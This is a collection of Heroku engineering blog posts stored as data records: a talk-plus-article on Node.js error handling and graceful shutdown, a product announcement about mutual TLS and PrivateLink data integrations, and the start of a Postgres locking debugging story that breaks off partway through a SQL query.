{"website": "Heroku", "title": "Let It Crash: Best Practices for Handling Node.js Errors on Shutdown", "author": ["Julián Duque"], "link": "https://blog.heroku.com/best-practices-nodejs-errors", "abstract": "Let It Crash: Best Practices for Handling Node.js Errors on Shutdown Posted by Julián Duque December 17, 2019 Listen to this article This blog post is adapted from a talk given by Julián Duque at NodeConf EU 2019 titled \" Let it crash! .\" Before coming to Heroku, I did some consulting work as a Node.js solutions architect. My job was to visit various companies and make sure that they were successful in designing production-ready Node applications. Unfortunately, I witnessed many different problems when it came to error handling, especially on process shutdown. When an error occurred, there was often not enough visibility on why it happened, a lack of logging details, and bouts of downtime as applications attempted to recover from crashes. Julián:             Okay. So, as Brian said, my name is Julián Duque, it will be in proper Spanish. I come from a very beautiful town in Columbia called Medellín. So, if you haven't gone there, please visit us. That we have an amazing community, as Brian said. Right now, I work as a senior developer advocate for Heroku. So, I live in United States. Sadly, I'm away from my country, but I always constantly in communication with my community, and that's pretty much true to main conferences that I organize. One is the NodeConf Colombia and the other is the JSConf Colombia. So, I know if you are like me right now, you are needing coffee. I'm needing coffee too. It's super early. So, please don't crash now. Let's wait until my talk finish, and we can have some coffee to keep us awake. Julián:             So, a little bit of some background about this talk, why I presented this. These are pretty much lessons learned while I was working at NodeSource, previously. I was doing consulting work as a solutions architect, pleasing the customer, making sure they were using Node.js properly and they were successfully using Node. And I saw a lot of different bad patterns out there on how other companies were doing error handling, and especially when the process were crashing or the process were dying. They didn't have enough visibility. They didn't have logging strategies in place. They were missing the very important information about why the Node processes were having issues or were crashing. They were experiencing downtime, and we started to collect in a set of best practices and recommendations for them, that are aligned with the overall Node.js community. Julián:             If you go to the documentation, there are going to be pretty much the same recommendations that I'm going to be speaking about today. We add a couple other more things to make sure you have a very good exit strategy for your Node.js Processes. These best practices applies pretty much for web and network based applications because we are going to cover also the graceful shutdowns, but you can use them for other type of Node.js applications that are constantly running. And Node, sadly, is not Erlang. If you know about Erlang or leaks related crashes, just like a term that it's very common in that community. When I started learning Erlang back in 2014, I loved the fault tolerance options that these platform and language has. And I always think about how to bring the same experience into Node.js, is not the same because you can't do whole code reloading or function swapping on Node. You can do those things on Erlang, but still, Node is pretty lightweight, and you can easily restart and recover from a crash. Julián:             First, before getting into the bad place or when bad things happen, how to make sure that everything is good? What do we need to do to our Node applications to make sure they are running properly? So, first, as a recommendation, and there is going to be a workshop later about this specific thing, cloud native JS, don't miss this worship by Beth. She's going to also mention about how to add health checks to you Node.js processes. So, pretty much as our recommendation, add a health check route, it's a simple route that is going to return a 200 status code, and you will need to set something to monitor that route. You can do it at your loa balancer level. If you are using a reverse proxy, or a load balancer like nginx, or HAProxy, or you're using ELB, ALB, any type of application that is being the top layer of your Node.js process being constantly monitoring that the health check is returning okay. So you are making sure that everything is fine. Julián:             And also, rely on APM, some tools that are going to monitor the performance and the health of your Node.js Processes. So, in order to make sure that everything is running fine, you will need to have tools, some very known tools, New Relic, App Dynamics, Dynatrace, and N|Solid. A lot of them in the market will give you way more visibility around the health of your Node.js processes, and you can live in peace when you are making sure your Node is running properly. But what to do if something bad and unexpected happens? So, what should we do with our Node.js processes? Letting them crash. If something bad and unexpected happened, I will let my Node.js process crash, but in order to be able to do it and drive, we will need to implement a set of best practices and follow some steps to make sure that the application is going to restart properly and continue running and serving to our customers and clients. Julián:             Before letting it crash, we will need to learn about the process lifecycle, especially on the shutdown side of things, some error handling best practices. There is going to be also another very recommended workshop around it. I'm not going to be covering how to properly handle errors in Node.js, just on shutdown, and this is pretty much so you stop worrying about unexpected errors and increased visibility of your Node.js processes, increased visibility of what happened when your process crashes and what might be the reason, so you can fix it and iterate over your application. So, similar to coming back to the Erlang concept, a Node.js process is very lightweight. It's a small in memory. It doesn't have a very big memory footprint, and the idea is to keep the processes very lean at a startup, so they can start like super fast. If you have a lot of operations, like high intensive CPU or synchronous operation at a startup, it might decrease the ability to restart super fast, your Node.js processes. Julián:             So, try to keep your processes very lean on a startup. Use the strategies, like prebuilding, so you are not going to build on a startup or on the bootstrap of your process. Do everything before you are going to start your process, and if something unexpected and bad happens, just exit and start a new Node.js process as soon as possible to avoid downtime. And pretty much this is called a restart. You're late in the process crash, and then start the new one. But we will need to have some tools in place and settings to be able to have something that restarts all our Node.js processes. So, let's learn how to exit a Node.js process. So, there are two common methods on the process module that will help you to shut down or terminate a Node.js process. The most common one is the process.exit. You can pass an exit code, the zero if it's a success exit or higher than zero, commonly one, if it's a failure. And this pretty much instructs Node.js to end a process with a specified exit code. Julián:             And there is the other one, which is a process.abort. With the process.abort, it's going to cause Node.js process to exit immediately and generate the core file, if your operating system has core dumps enabled. So, in order to be able to have more visibility on postmortem debugging, to be able to see what happened or what clashes your Node.js process. If there is a memory issue, you can call process.abort, it will generate a core dump, and then you can use tools like llnode, which is a plugin for lldb to do a C and C++ debugging of the core dump, and to see what might happen in the native side of Node.js when your process scratch. So those are the two options you have to exit the Node.js process. How to handle exit events? So Node.js, it needs two different or two main events when your Node.js process is exiting. One is the beforeExit. So the beforeExit, it's a handle that can make asynchronous calls and the event loop will continue to work until it finishes. Julián:             So before the process is ending, you can schedule more work on the event loop, do more a synchronous task and then you can clean up your process. This event is not immediate on conditions that are causing explicit termination like on an uncaught exception or when I explicitly call process that exit. So this is all other exit scenarios. And the exit event, it's a handle, also can't make a synchronous call. Only synchronous calls can happen in this part of the process life cycle because the event loop doesn't have any more work to do. So the event loop is paused in here. So, if you try to do any asynchronous calling here, is not going to be executed. Only synchronous calls can happen here and this event is immediate when process.exit is called explicitly. It's commonly used if you want to log at the end, some information when you process.exit, my process.exit with the specific exit code and you want to add some more context around the state of your application at the time that the process exits. Julián:             Some examples how to use it. You attach those events on the process module. The beforeExit can do asynchronous code so that setTimeout, even though the event loop is pause at that moment when you are scheduled more asynchronous work, it will receive the event loop and continue until there is no more work to do. There's one thing I want to mention here is that normally a Node.js process exits when there is no more work is scheduled on the event loop. When there is nothing else on the event loop, a process is going to exit. How does a server keeps running? Because it has a handle register on the event loop, like a socket waiting for connections and that's why a web server is constantly running until you close the server or you interrupt the process. Otherwise, if there is something register on the event loop, the Node.js process is going to continue running. So in this case, I execute setTimeout, schedule more work, it will continue working on until there is no more left to do. Julián:             On process.exit, pretty much just synchronous calls. I can do anything here with the event loop. The event loop is thoroughly paused, useful for logging information or saving the state of the application and exit. There is are a couple of signal events that are going to be useful on shutdown. There is the SIGTERM and SIGINT. SIGTERM, it's normally immediate when a process monitor send a signal termination to your Node.js process to tell them that there is going to be a successful way to shut down your process. When you execute on systemd or using upstart, when you send stop that service or stop that process, it's going to sending that SIGTERM to your Node.js process and you can handle that event and do some work on that specific part of the life cycle. And the SIGINT, it's an interruption. It is immediate when you interrupt the Node.js processes, normally when you do control-C, when you are running on the console, you can also capture that event and do some work around it. Julián:             So these are two ways to expectedly finalize a Node.js process. So these two events are considered a successful termination. This is why I'm exiting here with the exit code zero because it is something that is expected. I say I don't want this process to continue running. And there is also the error events. So there are two main error events. One is the uncaughtException, the famous uncaughtException. And recently, in promises we're introducing to Node, the unhandledRejection. So the uncaught exception is immediate when a JavaScript error is not properly handled. So it pretty much represents a programmer error or represents a bug in your code. If an uncaughtException happens, the recommendation is to always crash your process, let it crash. Don't try to recover from an uncaughtException because it might give you some troubles. And while even though, the community is not totally agree on the second one. Julián:             I will say the same for an unhandledRejection. An unhandledRejection, it is immediate when a promise is rejected and there is no handle attached to the promise. So there is no catch attached to the promise. It my represent an operational error, it my represent a programmer error, so it depends of what happened here. But in both of those cases, it's better to log as much information as possible. Treat those as P1 issues that needs to be fixed in the next iteration or in the next release. So if you don't have any strategy in place to be able to identify why your processes are crashing and you are not fixing and handling those properly, your application are going to remain having box. So if it is an uncaught exception, that's a bug, that's a programming error, that is something that is not expected. Please crash, log and file an issue, so that needs to be fixed. Julián:             If it is an unhandled rejection, see if this is a programmer error or if it's an operational error that needs to be handled and go update the code, add the proper handling to that promise and continue with your job. So as I say in both cases an error event, it's a cause of termination for your Node.js process. Always exit the process with an exit code different than zero. So it's going to be one. So your process monitor and your logs know that it was a failure and as I say, don't try to recover from an uncaught exception. While I was working as a consultant, I saw a lot of people trying to do a lot of magic to avoid the Node.js processes dying by adding some complex logic on uncaught exception. And that always ended your application on a bad state. They were having memory leaks or having sockets hanging and it was a mess. So it's cheaper to let it crash, start a new process from a scratch and continue receiving more requests. Julián:             So a couple of examples on uncaught exception and unhandled rejection. The uncaught exception received such an argument and error instance. So you get the information about the error that was thrown or that wasn't handling your Node.js code. And the unhandled rejection is going to give you a reason which can be an error instance tool and it will give you the promise that was not properly handled. So those are useful information that you can have in your logs to have more information where things are failing in your code. But we saw how to handle the events, how to handle the errors, some of the best practices, but how to do it properly? What we need to do a better to be able to have a very good shutdown a strategy for Node.js processes? So the first one is running more than one process at the same time. So rely on scaling load balancer processes, having more than one. So in that way, if one of those processes crashes, there is another process that is alive and it's able to receive requests. Julián:             So it will give you time to do the restart and all the requests that are coming in. And maybe the only issue you are going to have are with the requests that were already happening in the Node.js process that crashes. But this is going to give you a little bit more leverage and prevent downtime. And what do you use for load balancing? Use whatever you have in hand. If it's nginx or HAProxy as a reverse proxy for your Node.js applications. If you are on AWS or on the cloud, you can use their elastic load balancer application, load balancers or the order load-balancer solutions that cloud offers. If you are on Kubernetes, you can use Ingress or other different in the load balancer strategies for your application. So pretty much make sure that you have more than one Node.js process running, so you can be more in peace if one of those processes crashes. You will need to have process monitoring and process monitoring needs a pretty much something that is running in your operating system or an application that it's constantly checking if your process is alive or not. Julián:             If it crashes, if there is a failure, the process monitor is in charge of restarting the process. So, the recommendation is to always use the native process monitoring that it's available on your operating system. If it's Unix or Linux, you can use systemd or upstart, specifically adding the restart on failure or respond when you are working on upstart. If you are using containers, use whatever is available. Docker has the restart option, Kubernetes has the restart policy and you can also configure your processes to restart when it fails to retry a number of times. So you don't go into a crazy error, that is going to constantly make your application crash and you end up in the crash loop. So you can add some retries into there but always have a process monitoring in place. If you can't use any of these tools as a last resource--but not recommended--use a Node.js process monitor like PM2 or forever. Julián:             But I will not recommend these to any customer of mine or any friend, but if you don't have any more resource, if you can use the native stuff in your operating system or if you are not using containers, you can go this way. These tools are good for development. Don't get me wrong. If you are logging on the development and they're very good tools to restart your processes when the crashes. But for production, they might not be the best. Let's talk about little bit about a graceful shutdown. So we have a web server running. The web server is getting request and it's getting connection. Sometime we have some established connections between our customers or clients and the server. But what happens when the process crashes? When the process crashes, if we are not doing a graceful shutdown, some of those sockets are going to be kept hanging and are going to wait until a timeout has been reached and that might cause down time and a decreased experience of your users. So it is better. So setting up an un-reference timeout is going to let the server do its job. Julián:             So, we will need to close the server, it's explicitly say to the server, stop receiving connections so they can reject the new connection. So new connections are going to the new or to the other Node.js process that is running through the load balancer and it will be able to send a TCP packet to the clients that are already connected. So they are going to be finishing the connection immediately when the server dies. They are not going to stay waiting until a timeout is reach out. They are going to be closing that connection and on the next retry, we expect that the process has restarted at that point or they go to another process that is running. So one example of that, un-reference time out, when we are handling the signal or error event, which is the shutdown part of the life cycle. What we can do, it's too explicitly call server.close. If it is an instance of the net server, which is the same one that uses the http or https, Node modules, you can pass a callback. Julián:             So when it finishes closing the connection, it will exit the process successfully. But we will need to have our timeout in place because we don't want to wait for a long time. Imagine if we had a lot of different clients connected that it's taken a lot of time to clean up those processes. We need to have some way to have an internal timeout. So here, we are scheduling a new timeout, but that timeout is not on the event loop. That last part the, unref is not the scheduling the timeout on the event loop, so it is not adding more work to the event loop. So when the timeout is reach or the server close callback is reach, either of those paths are going to close the Node.js process. So this is a race between the two, between your time out that is not in the event loop or between the server close, whichever works better. And what timeout time we do need to put here depending on the needs of your applications. Julián:             We had customers that had the need to have very few timeouts or a small time out because they were doing a lot of real time trading and they needed the processes to restart as far as possible. There are others that can have longer timeouts to lead, or when the connection finishes, so this depends of the use case. If you don't add the unref in here, since this timeout is going to be a schedule on the event loop, it's going to wait until it finishes and the process is going to end. So this is like a safeguard. So there is no more work schedule on the event loop while we are exiting our process. Logging, this is one of the most important parts of having a very good exit strategy for Node.js processes. So implement the robust logging strategy for your application, especially on shutdown. If an error happens, please log as much information as possible. An error object will contain not only the message or the cost of the error, but it will also contain the stack trace. Julián:             So if you log the stack trace, you will be able to come back to your code and fix and look specifically why it failed and where it fail. And you can rely on libraries, like pino or winston and use transport to store the logs in an external service. You can use like Splunk or Papertrail or use whatever you like to store the logs. But have a way to always go back to the logs, search for those uncaught exceptions and unhandled rejections and being able to identify why your processes are crushing. Fix those issues and continue with your work. So how can we put these altogether? I have some pattern I use on my projects but there is also a lot of modules on NPM that are going to do the same thing even better than the approach I'm following here. So this is a pattern I use. I create a module called terminate or I use a file called terminate. I pass the server like the instance of that server that I'm going to be closing and some configuration options if I want to enable core dumps or not, and the timeout. Julián:             Usually when I want to enable the core dump of Node, I use an environment variable. When I am going to do some performance testing on my application or I want to replicate the error, I enable the core dump. I let it crash with the process.abort, I check out the core dump and get more information about it. So here, I have our exit function that switches between the abort or the process.exit, depending of the configuration you have here. And the rest, I'm returning a function that returns a function and that function is the one that I'm going to be using as the exit handler. And this is pretty much the code that I'm going to be using for uncaught exceptions, unhandled rejections, and signals. And here, log as much as possible. I'm using console log for simplicity, but please use a proper logging library here. And pretty much if there is an error and if that is an instance of the error, I want to get information about the message and the stack trace. And at the end, I'm going to be trying doing the graceful shutdown. Julián:             So this is the same thing I explained before. I will close this server and also I will have a timeout to also close the server after that timeout happens. So it depends whatever ends first. And how to use this small module I have here, this is as an example, I have an issue to the server. I have my terminate code that I use for my project. I create an exit handler with the options with the server I'm running, with the different parameters I want to pass into my exit handler and I attach that function into the different events. So here exit handler, on uncaught exception and unhandled rejection, I'm going to return an exit code of one and I can add a message to my logs to say what type of error or what type of handling was this, and also with the signals. And with the signals, I'm passing an exit code of zero because it is something that there is going to be successful. Julián:             So this is pretty much what I have for today and the presentation, some resources that are going to be useful for you. Please don't miss Rubin Bridgewater workshop later today. It's going to be called \"Error Handling: doing it right\". Again, it's going to be explaining now how to avoid getting here? How to avoid getting into the uncaught exception side of things? How to properly create the error objects to have more visibility? How to handle promises, rejections? So, these are going to be a very good presentation and also the cloud native JS by Beth. She's going to be mentioning also how to add monitoring to application health checks. So those are going to be good things if you want to run Node.js properly in production. Some NPM modules to take a look that pretty much solve the issue I was talking about today. There is a module I like, the terminus by the team at GoDaddy. Julián:             It supports adding health checks to your application. It has a C signal handlers too. It has a very good graceful shutdown strategy. Way more complex than the one I presented you. This is something that you can add to your projects pretty easily. Just create an instance of terminus, configure it, and add the different handlers there. There is another module called stoppable. Stoppable is the decorator over the server class that is going to be able to implement not a close function, but a stop function and it's going to be also doing a lot of things around a graceful shutdown. And there is also a module that pretty much is what I presented today. It's called http-graceful-shutdown. You also pass an instance of your HTTP server and it has different handlers, you can see what happened when there is an error or what signals I'm going to be monitoring. Julián:             It's pretty much... It's all going to be resources that are going to simplify your life and make you a better up running Node in production and you will be able to let it crash. One last thing, I want to invite you to Nodeconf Colombia, so save the day. This is going to happen June 26 and 27, 2020. It's going to happen in Medellín, Columbia. More information at nodeconf.co. CFP is not open yet, but I will expect a lot of you all sending proposals to go to Medellin. We pay for travel, we pay for a hotel. And if you want to know a little bit about the experience of speaking at a conference in Columbia, you can ask James, you can ask Anna, and I think you can ask Brian. There is a couple of folks here that have spoken there and thank you very much. This is it. We started to assemble a collection of best practices and recommendations on error handling, to ensure they were aligned with the overall Node.js community. In this post, I'll walk through some of the background on the Node.js process lifecycle and some strategies to properly handle graceful shutdown and quickly restart your application after a catastrophic error terminates your program. The Node.js process lifecycle Let's first explore briefly how Node.js operates. A Node.js process is very lightweight and has a small memory footprint. Because crashes are an inevitable part of programming, your primary goal when architecting an application is to keep the startup process very lean, so that your application can quickly boot up. If your startup operations include CPU intensive work or synchronous operations, it might affect the ability of your Node.js processes to quickly restart. A strategy you can use here is to prebuild as much as possible. That might mean preparing data or compiling assets during the building process. It may increase your deployment times, but it's better to spend more time outside of the startup process. Ultimately, this ensures that when a crash does happen, you can exit a process and start a new one without much downtime. Node.js exit methods Let's take a look at several ways you can terminate a Node.js process and the differences between them. The most common function to use is process.exit() , which takes a single argument, an integer. If the argument is 0 , it represents a successful exit state. If it's greater than that, it indicates that an error occurred; 1 is a common exit code for failures here. Another option is process.abort() . When this method is called, the Node.js process terminates immediately. More importantly, if your operating system allows it, Node will also generate a core dump file, which contains a ton of useful information about the process. You can use this core dump to do some postmortem debugging using tools like llnode . Node.js exit events As Node.js is built on top of JavaScript, it has an event loop, which allows you to listen for events that occur and act on them. When Node.js exits, it also emits several types of events. One of these is beforeExit , and as its name implies, it is emitted right before a Node process exits. You can provide an event handler which can make asynchronous calls, and the event loop will continue to perform the work until it's all finished. It's important to note that this event is not emitted on process.exit() calls or uncaughtException s; we'll get into when you might use this event a little later. Another event is exit , which is emitted only when process.exit() is explicitly called. As it fires after the event loop has been terminated, you can't do any asynchronous work in this handler. The code sample below illustrates the differences between the two events: process.on('beforeExit', code => {\n  // Can make asynchronous calls\n  setTimeout(() => {\n    console.log(`Process will exit with code: ${code}`)\n    process.exit(code)\n  }, 100)\n})\n\nprocess.on('exit', code => {\n  // Only synchronous calls\n  console.log(`Process exited with code: ${code}`)\n}) OS signal events Your operating system emits events to your Node.js process, too, depending on the circumstances occurring outside of your program. These are referred to as signals . Two of the more common signals are SIGTERM and SIGINT . SIGTERM is normally sent by a process monitor to tell Node.js to expect a successful termination. If you're running systemd or upstart to manage your Node application, and you stop the service, it sends a SIGTERM event so that you can handle the process shutdown. SIGINT is emitted when a Node.js process is interrupted, usually as the result of a control-C ( ^-C ) keyboard event. You can also capture that event and do some work around it. Here is an example showing how you may act on these signal events: process.on('SIGTERM', signal => {\n  console.log(`Process ${process.pid} received a SIGTERM signal`)\n  process.exit(0)\n})\n\nprocess.on('SIGINT', signal => {\n  console.log(`Process ${process.pid} has been interrupted`)\n  process.exit(0)\n}) Since these two events are considered a successful termination, we call process.exit and pass an argument of 0 because it is something that is expected. JavaScript error events At last, we arrive at higher-level error types: the error events thrown by JavaScript itself. When a JavaScript error is not properly handled, an uncaughtException is emitted. These suggest the programmer has made an error, and they should be treated with the utmost priority. Usually, it means a bug occurred on a piece of logic that needed more testing, such as calling a method on a null type. An unhandledRejection error is a newer concept. It is emitted when a promise is not satisfied; in other words, a promise was rejected (it failed), and there was no handler attached to respond. These errors can indicate an operational error or a programmer error, and they should also be treated as high priority. In both of these cases, you should do something counterintuitive and let your program crash ! Please don't try to be clever and introduce some complex logic trying to prevent a process restart. Doing so will almost always leave your application in a bad state, whether that's having a memory leak or leaving sockets hanging. It's simpler to let it crash, start a new process from scratch, and continue receiving more requests. Here's some code indicating how you might best handle these events: process.on('uncaughtException', err => {\n  console.log(`Uncaught Exception: ${err.message}`)\n  process.exit(1)\n}) We’re explicitly “crashing” the Node.js process here! Don’t be afraid of this! It is more likely than not unsafe to continue. The Node.js documentation says, Unhandled exceptions inherently mean that an application is in an undefined state...The correct use of 'uncaughtException' is to perform synchronous cleanup of allocated resources (e.g. file descriptors, handles, etc) before shutting down the process. It is not safe to resume normal operation after 'uncaughtException'. process.on('unhandledRejection', (reason, promise) => {\n  console.log('Unhandled rejection at ', promise, `reason: ${err.message}`)\n  process.exit(1)\n}) unhandledRejection is such a common error, that the Node.js maintainers have decided it should really crash the process, and they warn us that in a future version of Node.js unhandledRejection s will crash the process. [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code. Run more than one process Even if your process startup time is extremely quick, running just a single process is a risk to safe and uninterrupted application operation. We recommend running more than one process and to use a load balancer to handle the scheduling. That way, if one of the processes crashes, there is another process that is alive and able to receive new requests. This is going to give you a little bit more leverage and prevent downtime. Use whatever you have on-hand for the load balancing. You can configure a reverse proxy like nginx or HAProxy to do this. If you're on Heroku, you can scale your application to increase the number of dynos. If you're on Kubernetes, you can use Ingress or other load balancer strategies for your application. Monitor your processes You should have process monitoring in-place, something running in your operating system or an application environment that's constantly checking if your Node.js process is alive or not. If the process crashes due to a failure, the process monitor is in charge of restarting the process. Our recommendation is to always use the native process monitoring that's available on your operating system. For example, if you're running on Unix or Linux, you can use the systemd or upstart commands. If you're using containers, Docker has a --restart flag , and Kubernetes has restartPolicy , both of which are useful. If you can't use any existing tools, use a Node.js process monitor like PM2 or forever as a last resort. These tools are okay for development environments, but I can't really recommend them for production use. If your application is running on Heroku, don’t worry—we take care of the restart for you! Graceful shutdowns Let's say we have a server running. It's receiving requests and establishing connections with clients. But what happens if the process crashes?  If we're not performing a graceful shutdown, some of those sockets are going to hang around and keep waiting for a response until a timeout has been reached. That unnecessary time spent consumes resources, eventually leading to downtime and a degraded experience for your users. It's best to explicitly stop receiving connections, so that the server can disconnect connections while it's recovering. Any new connections will go to the other Node.js processes running through the load balancer To do this, you can call server.close() , which tells the server to stop accepting new connections. Most Node servers implement this class, and it accepts a callback function as an argument. Now, imagine that your server has many clients connected, and the majority of them have not experienced an error or crashed. How can you close the server while not abruptly disconnecting valid clients? We'll need to use a timeout to build a system to indicate that if all the connections don't close within a certain limit, we will completely shutdown the server. We do this because we want to give existing, healthy clients time to finish up but don't want the server to wait for an excessively long time to shutdown. Here's some sample code of what that might look like: process.on('<signal or error event>', _ => {\n  server.close(() => {\n    process.exit(0)\n  })\n  // If server hasn't finished in 1000ms, shut down process\n  setTimeout(() => {\n    process.exit(0)\n  }, 1000).unref() // Prevents the timeout from registering on event loop\n}) Logging Chances are you have already implemented a robust logging strategy for your running application, so I won't get into it too much about that here. Just remember to log with the same rigorous quality and amount of information for when the application shuts down! If a crash occurs, log as much relevant information as possible, including the errors and stack trace. Rely on libraries like pino or winston in your application, and store these logs using one of their transports for better visibility. You can also take a look at our various logging add-ons to find a provider which matches your application’s needs. Make sure everything is still good Last, and certainly not least, we recommend that you add a health check route. This is a simple endpoint that returns a 200 status code if your application is running: // Add a health check route in express\napp.get('/_health', (req, res) => {\n  res.status(200).send('ok')\n}) You can have a separate service continuously monitor that route. You can configure this in a number of ways, whether by using a reverse proxy, such as nginx or HAProxy, or a load balancer, like ELB or ALB. Any application that acts as the top layer of your Node.js process can be used to constantly monitor that the health check is returning. These will also give you way more visibility around the health of your Node.js processes, and you can rest easy knowing that your Node processes are running properly. There are some great great monitoring services to help you with this in the Add-ons section of our Elements Marketplace . Putting it all together Whenever I work on a new Node.js project, I use the same function to ensure that my crashes are logged and my recoveries are guaranteed. It looks something like this: function terminate (server, options = { coredump: false, timeout: 500 }) {\n  // Exit function\n  const exit = code => {\n    options.coredump ? process.abort() : process.exit(code)\n  }\n\n  return (code, reason) => (err, promise) => {\n    if (err && err instanceof Error) {\n    // Log error information, use a proper logging library here :)\n    console.log(err.message, err.stack)\n    }\n\n    // Attempt a graceful shutdown\n    server.close(exit)\n    setTimeout(exit, options.timeout).unref()\n  }\n}\n\nmodule.exports = terminate Here, I've created a module called terminate . I pass the instance of that server that I'm going to be closing, and some configuration options, such as whether I want to enable core dumps, as well as the timeout. I usually use an environment variable to control when I want to enable a core dump. I enable them only when I am going to do some performance testing on my application or whenever I want to replicate the error. This exported function can then be set to listen to our error events: const http = require('http')\nconst terminate = require('./terminate')\nconst server = http.createServer(...)\n\nconst exitHandler = terminate(server, {\n  coredump: false,\n  timeout: 500\n})\n\nprocess.on('uncaughtException', exitHandler(1, 'Unexpected Error'))\nprocess.on('unhandledRejection', exitHandler(1, 'Unhandled Promise'))\nprocess.on('SIGTERM', exitHandler(0, 'SIGTERM'))\nprocess.on('SIGINT', exitHandler(0, 'SIGINT')) Additional resources There are a number of existing npm modules that pretty much solve the aforementioned issues in a similar ways. You can check these out as well: @godaddy/terminus stoppable http-graceful-shutdown Hopefully, this information will simplify your life and enable your Node app to run better and safer in production! shutdown error handling node.js", "date": "2019-12-17,"},
{"website": "Heroku", "title": "Announcing Heroku Data Services Integrations Using mutual TLS and PrivateLink", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/data-services-integrations", "abstract": "Announcing Heroku Data Services Integrations Using mutual TLS and PrivateLink Posted by Scott Truitt November 07, 2019 Listen to this article Today, we’re thrilled to announce four new trusted data integrations that allow data to flow seamlessly and securely between Heroku and external resources in public clouds and private data centers: Heroku Postgres via mutual TLS Heroku Postgres via PrivateLink Apache Kafka on Heroku via PrivateLink Heroku Redis via PrivateLink These integrations expand Heroku's security and trust boundary to cover the connections to external resources and the data that passes through them. They enable true multi-cloud app and data architectures and keep developers focused on delivering value versus managing infrastructure. Data is the driving force in modern app development, and these integrations further enhance its value on Heroku by exposing new options for enrichment, analysis, learning, archiving, and more. Personalized Apps and Experiences with Sensitive and Regulated Data Customers are increasingly working with sensitive and regulated data on Heroku and other public clouds or in private data centers. Looking across their use cases, workflows, and challenges, we see two requests emerge: Developers want more agility and flexibility. Enterprises want ironclad safety and security. The use of sensitive and regulated data enables more personalized apps and unique experiences. Working with sensitive and regulated data also introduces greater legal complexities, especially when data crosses cloud boundaries. Heroku’s trusted and compliant data services minimize this risk, so organizations can stay focused on innovating with their data. First, Heroku Shield provides a set of Heroku platform services that offer additional security features needed for building and running sensitive and regulated data applications. Next, Shield versions of Heroku Postgres, Heroku Redis, and Apache Kafka on Heroku are dedicated, network-isolated data services with strict security rules and compliance standards. And now, our new family of trusted data integrations allows Heroku managed data services to connect to and exchange data with other public clouds or private data centers. All new trusted data integrations are enabled as of today, included at no additional charge, durable across maintenances and HA failovers, and available in all six Private and Shield Spaces global regions: Sydney, Tokyo, Frankfurt, Dublin, Oregon, and Virginia.\nRead on for more information on what’s new and how to get started. Trusted Data Integrations Between Heroku, Other Public Clouds, and Private Data Centers Heroku Postgres via mutual TLS This integration allows customers to easily encrypt and mutually authenticate connections between Private and Shield Postgres databases and resources running in other public clouds and private data centers. Heroku Postgres via mutual TLS requires that both the server and the client verify their certificates and identities to ensure that each one is authenticated and authorized to share data. For additional security, Heroku requires an allowlisted IP or IP range for the client and valid Heroku Postgres credentials. We also log the creation of a mutual TLS connection, notify admin members on the account, and periodically send reminder notifications as long as it is live. The entire mutual TLS configuration and lifecycle is managed by Heroku to maintain security and meet compliance standards. It’s designed to be configured once and updated every year with new certificates, so the integration recedes into the background of the developer workflow. Get started with Heroku Postgres via mutual TLS . Trusted Data Integrations Between Heroku and AWS Heroku Postgres via PrivateLink Earlier this year, we released Heroku Postgres via PrivateLink , which enabled Heroku Postgres databases in Private Spaces to integrate with resources in one or more Amazon VPCs. PrivateLink connections are secure and stable by default because traffic stays on the AWS private network; once a PrivateLink is set up, there is no brittle networking configuration to manage. We now provide PrivateLink support for Heroku Postgres in Shield Spaces, so that sensitive and regulated data can flow securely and seamlessly between Heroku and AWS. We now log the creation of a PrivateLink, notify admin members on the account, and periodically send reminder notifications as long as it is live. We have also applied these changes to the Private Space version. Get started with Heroku Postgres via PrivateLink . Apache Kafka on Heroku via PrivateLink We also now provide the same PrivateLink support for Apache Kafka on Heroku in Private and Shield Spaces. Just over a month ago, we released Apache Kafka on Heroku Shield and it too now has the ability to integrate with Amazon VPCs for true multi-cloud architectures and best-of-breed solutions. We log, notify, and remind customers as long as this integration is live. Get started with Apache Kafka on Heroku via PrivateLink . Heroku Redis via PrivateLink Finally, we now provide the same PrivateLink support for Heroku Redis in Private Spaces . Likewise, we log, notify, and remind customers while the integration is live. Get started with Heroku Redis via PrivateLink . Get Started Today Heroku balances developer agility and flexibility with enterprise safety and security. Our new trusted data integrations enable sensitive and regulated data to be used across multiple clouds. This allows for true multi-cloud app and data architectures that integrate resources from Heroku, public clouds, and private data centers. We built these new Trusted data integrations for you and we’re excited to see what you build with them. Please send any feedback our way. Want to learn more about Heroku Data Services integrations using mutual TLS and PrivateLink? Contact sales database Shield Private Spaces postgres redis apache kafka Amazon Private data center AWS PrivateLink mTLS", "date": "2019-11-07,"},
{"website": "Heroku", "title": "The Curious Case of the Table-Locking UPDATE Query", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/curious-case-table-locking-update-query", "abstract": "The Curious Case of the Table-Locking UPDATE Query Posted by Richard Schneeman December 18, 2019 Listen to this article Update: On closer inspection, the lock type was not on the table, but on a tuple. For more information on this locking mechanism see the internal Postgresql tuple locking documentation . Postgres does not have lock promotion as suggested in the debugging section of this post. I maintain an internal-facing service at Heroku that does metadata processing. It's not real-time, so there's plenty of slack for when things go wrong. Recently I discovered that the system was getting bogged down to the point where no jobs were being executed at all. After hours of debugging, I found the problem was an UPDATE on a single row on a single table was causing the entire table to lock, which caused a lock queue and ground the whole process to a halt. This post is a story about how the problem was debugged and fixed and why such a seemingly simple query caused so much harm. No jobs processing I started debugging when the backlog on our system began to grow, and the number of jobs being processed fell to nearly zero. The system has been running in production for years, and while there have been occasional performance issues, nothing stood out as a huge problem. I checked our datastores, and they were well under their limits, I checked our error tracker and didn't see any smoking guns. My best guess was the database where the results were being stored was having problems. The first thing I did was run heroku pg:diagnose , which shows \"red\" (critical) and \"yellow\" (important but less critical) issues. It showed that I had queries that had been running for DAYS: 68698   5 days 18:01:26.446979  UPDATE \"table\" SET <values> WHERE (\"uuid\" = '<uuid>') Which seemed odd. The query in question was a simple update, and it's not even on the most massive table in the DB. When I checked heroku pg:outliers from the pg extras CLI plugin I was surprised to see this update taking up 80%+ of the time even though it is smaller than the largest table in the database by a factor of 200. So what gives? Running the update statement manually didn't reproduce the issue, so I was fresh out of ideas. If it had, then I could have run with EXPLAIN ANALYZE to see why it was so slow. Luckily I work with some pretty fantastic database engineers, and I pinged them for possible ideas. They mentioned that there might be a locking issue with the database. The idea was strange to me since it had been running relatively unchanged for an extremely long time and only now started to see problems, but I decided to look into it. SELECT\n  S.pid,\n  age(clock_timestamp(), query_start),\n  query,\n  L.mode,\n  L.locktype,\n  